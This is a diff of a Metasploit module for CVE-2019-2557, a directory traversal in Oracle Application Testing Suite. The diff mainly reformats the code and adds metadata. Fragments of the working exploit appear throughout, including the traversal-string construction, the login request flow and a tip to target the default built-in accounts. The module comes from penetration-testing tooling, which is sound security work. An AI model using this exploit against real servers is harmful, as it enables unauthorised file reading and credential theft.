@@ -9,38 +9,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Oracle Application Testing Suite Post-Auth DownloadServlet Directory Traversal',
-      'Description'    => %q{
-        This module exploits a vulnerability in Oracle Application Testing Suite (OATS). In the Load
-        Testing interface, a remote user can abuse the custom report template selector, and cause the
-        DownloadServlet class to read any file on the server as SYSTEM. Since the Oracle application
-        contains multiple configuration files that include encrypted credentials, and that there are
-        public resources for decryption, it is actually possible to gain remote code execution
-        by leveraging this directory traversal attack.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Oracle Application Testing Suite Post-Auth DownloadServlet Directory Traversal',
+        'Description' => %q{
+          This module exploits a vulnerability in Oracle Application Testing Suite (OATS). In the Load
+          Testing interface, a remote user can abuse the custom report template selector, and cause the
+          DownloadServlet class to read any file on the server as SYSTEM. Since the Oracle application
+          contains multiple configuration files that include encrypted credentials, and that there are
+          public resources for decryption, it is actually possible to gain remote code execution
+          by leveraging this directory traversal attack.
 
-        Please note that authentication is required. By default, OATS has two built-in accounts:
-        default and administrator. You could try to target those first.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          Please note that authentication is required. By default, OATS has two built-in accounts:
+          default and administrator. You could try to target those first.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Steven Seeley', # Original discovery
-          'sinn3r'         # Metasploit module
+          'sinn3r' # Metasploit module
         ],
-      'DefaultOptions' =>
-        {
+        'DefaultOptions' => {
           'RPORT' => 8088
         },
-      'References'     =>
-        [
+        'References' => [
           ['CVE', '2019-2557'],
           ['URL', 'https://srcincite.io/advisories/src-2019-0033/'],
           ['URL', 'https://www.oracle.com/security-alerts/cpuapr2019.html']
         ],
-      'DisclosureDate' => '2019-04-16'
-    ))
+        'DisclosureDate' => '2019-04-16',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -48,7 +53,8 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('DEPTH', [true, 'The max traversal depth', 1]),
         OptString.new('OATSUSERNAME', [true, 'The username to use for Oracle', 'default']),
         OptString.new('OATSPASSWORD', [true, 'The password to use for Oracle']),
-      ])
+      ]
+    )
   end
 
   class OracleAuthSpec
@@ -75,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
   def check
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(target_uri.path, 'olt/')
+      'uri' => normalize_uri(target_uri.path, 'olt/')
     })
 
     if res && res.body.include?('AdfLoopbackUtils.runLoopback')
@@ -116,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
     uri = normalize_uri(target_uri.path, 'olt', 'faces', 'login')
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => uri,
+      'uri' => uri,
     })
 
     fail_with(Failure::Unknown, 'No response from server') unless res
@@ -131,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
     uri = normalize_uri(target_uri.path, 'olt', 'faces', 'login')
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => uri,
+      'uri' => uri,
       'cookie' => "JSESSIONID=#{auth_spec.session_id}",
       'vars_get' =>
         {
@@ -156,7 +162,7 @@ class MetasploitModule < Msf::Auxiliary
     uri = normalize_uri(target_uri.path, 'olt', 'faces', 'login')
     res = send_request_cgi({
       'method' => 'POST',
-      'uri'    => uri,
+      'uri' => uri,
       'cookie' => "JSESSIONID=#{auth_spec.session_id}",
       'headers' =>
         {
@@ -189,7 +195,7 @@ class MetasploitModule < Msf::Auxiliary
     dots = '..\\' * datastore['DEPTH']
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => uri,
+      'uri' => uri,
       'cookie' => "JSESSIONID=#{auth_spec.session_id}",
       'vars_get' =>
         {
